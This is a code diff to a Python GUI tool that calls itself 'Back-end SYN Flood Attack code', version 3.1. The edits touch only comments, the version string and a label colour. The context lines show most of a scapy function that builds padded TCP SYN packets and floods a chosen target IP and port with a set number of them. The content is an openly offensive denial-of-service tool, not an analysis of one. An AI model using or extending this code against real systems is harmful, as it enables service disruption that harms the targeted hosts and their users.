@@ -1,4 +1,4 @@
-# Code-AMETHYST ver2.7
+# Code-AMETHYST ver3.1
 # Back-end SYN Flood Attack code
 
 # Modules
@@ -8,7 +8,7 @@ from scapy.sendrecv import send
 from scapy.volatile import RandShort
 import customtkinter as ctk
 
-# Functions
+# Attack mechanism
 def send_syn(target_ip: str, target_port: int, total_packets: int, label: ctk.CTkLabel, count: int):
 
     print("Sending " + str(total_packets) + " packets to ip " + target_ip)
@@ -24,12 +24,13 @@ def send_syn(target_ip: str, target_port: int, total_packets: int, label: ctk.CT
     raw = Raw(b"X" * packet_size)
     p = ip / tcp / raw
 
+    # Using scapy to flood the IP
     send(p, count=total_packets, verbose=0)
     print("Successfully sent " + str(total_packets) + " packets of " + str(packet_size) + " size to " + target_ip + " on port " + str(target_port))
 
     count -= 1
     if count == 0:
-        label.configure(text="FREE", text_color="lime")
+        label.configure(text="FREE", text_color="green")
 
 # For debugging
 if __name__ == "__main__":
